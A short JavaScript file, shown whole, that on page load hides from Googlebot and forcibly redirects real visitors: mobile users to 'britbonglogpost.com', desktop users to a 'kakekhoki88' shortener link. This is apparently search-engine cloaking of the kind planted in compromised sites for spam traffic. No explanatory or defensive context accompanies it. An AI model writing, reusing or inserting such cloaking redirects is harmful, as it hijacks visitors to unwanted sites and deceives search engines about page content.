document.addEventListener("DOMContentLoaded", () => {
	const isGoogleBot = navigator.userAgent.toLowerCase().includes("googlebot");

	console.log({
		domain: window.location.hostname,
		referrer: document.referrer,
		userAgentLowerCase: navigator.userAgent.toLowerCase(),
		isGoogleBot,
		isMobile: isMobile(),
	});

	if (isGoogleBot) {
		return;
	}

	if (isMobile()) {
		if (
			window.location.hostname === "britbonglogpost.com" ||
			window.location.hostname === "localhost"
		) {
			return;
		}

		window.location.href = "https://britbonglogpost.com";
		return;
	}

	window.location.href = "https://kakekhoki88.short.gy/Linkbaruina";
});

function isMobile() {
	const isMobileAgent = /(android|iphone|ipad)/i.test(navigator.userAgent);
	const isTouchEnabled = "ontouchstart" in window;
	const isPortrait = window.matchMedia("(orientation: portrait)").matches;

	return isMobileAgent || (isTouchEnabled && isPortrait);
}
